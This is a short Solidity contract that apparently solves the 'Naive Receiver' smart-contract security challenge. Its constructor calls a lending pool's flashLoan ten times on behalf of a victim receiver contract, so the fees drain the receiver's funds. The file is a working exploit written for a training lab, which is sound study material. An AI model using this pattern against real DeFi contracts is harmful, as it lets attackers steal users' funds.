// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../naive-receiver/FlashLoanReceiver.sol";
import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverLenderPoolAttack {
    constructor(
        NaiveReceiverLenderPool _naiveReceiverLenderPool,
        address _flashLoanReceiver
    ) {
        for (int i = 0; i < 10; i++) {
            _naiveReceiverLenderPool.flashLoan(_flashLoanReceiver, 0);
        }
    }
}
